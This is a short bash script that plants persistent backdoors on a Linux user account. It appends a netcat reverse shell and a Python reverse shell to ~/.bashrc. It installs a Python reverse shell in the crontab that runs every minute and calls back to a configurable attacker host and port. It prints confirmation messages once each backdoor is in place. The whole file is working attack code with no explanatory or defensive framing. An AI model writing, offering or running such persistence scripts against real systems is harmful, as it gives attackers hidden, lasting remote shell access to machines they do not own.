#!/bin/bash

attackBox=0.0.0.0
attackPort=5253
cron="* * * * *"

if $(env | grep -qi HOME);
then
	touch ~/.bashrc
	echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> ~/.bashrc
	if $(cat ~/.bashrc | grep $attackBox | grep -qi $attackPort);
	then
		echo "[+] Netcat reverse shell placed in $USER's bashrc"
		echo "[+] Calls back to $attackBox:$attackPort"
	fi
fi

if $(which python | grep -qi "python");
then
	crontab -l > /dev/shm/.cron.sh
	echo "$cron python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /dev/shm/.cron.sh
	crontab /dev/shm/.cron.sh
	rm /dev/shm/.cron.sh
	if $(crontab -l | grep "python" | grep -qi $attackBox);
	then
		echo "[+] Python reverse shell written to $USER's crontab"
		echo "[+] Calls back to $attackBox:$attackPort"
	fi
	echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001" >> ~/.bashrc
	if $(cat ~/.bashrc | grep $attackBox | grep -qi "python");
	then
		echo "[+] Python reverse shell placed in $USER's bashrc"
		echo "[+] Calls back to $attackBox:$attackPort"
	fi
fi
